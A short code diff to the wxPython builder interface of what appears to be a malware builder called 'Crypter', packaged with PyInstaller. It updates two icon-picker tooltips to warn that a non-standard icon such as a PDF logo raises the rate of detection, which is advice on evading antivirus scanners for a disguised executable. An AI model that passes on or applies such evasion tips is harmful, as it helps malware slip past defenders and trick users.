@@ -233,7 +233,7 @@ class MainFrame ( wx.Frame ):
 		self.IconLabel = wx.StaticText( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, u"File Icon", wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.IconLabel.Wrap( -1 )
 		self.IconLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
-		self.IconLabel.SetToolTipString( u"The icon (.ico) file to use for the Crypter executable. If left blank PyInstaller will use its own icon" )
+		self.IconLabel.SetToolTipString( u"The icon (.ico) file to use for the Crypter executable. If left blank PyInstaller will use its own icon.\n\nWarning: choosing an non standard EXE icon, such as a PDF logo, may drastically increase the rate of detection" )
 		
 		bSizer203211111.Add( self.IconLabel, 0, wx.ALL|wx.TOP, 7 )
 		
@@ -241,7 +241,7 @@ class MainFrame ( wx.Frame ):
 		bSizer203211111.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
 		self.IconFilePicker = wx.FilePickerCtrl( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, u"Select a file", u"*.ico", wx.DefaultPosition, wx.DefaultSize, wx.FLP_DEFAULT_STYLE|wx.FLP_FILE_MUST_EXIST|wx.FLP_SMALL )
-		self.IconFilePicker.SetToolTipString( u"The icon (.ico) file to use for the Crypter executable. If left blank PyInstaller will use its own icon" )
+		self.IconFilePicker.SetToolTipString( u"The icon (.ico) file to use for the Crypter executable. If left blank PyInstaller will use its own icon.\n\nWarning: choosing an non standard EXE icon, such as a PDF logo, may drastically increase the rate of detection" )
 		
 		bSizer203211111.Add( self.IconFilePicker, 0, wx.ALL, 5 )
 		
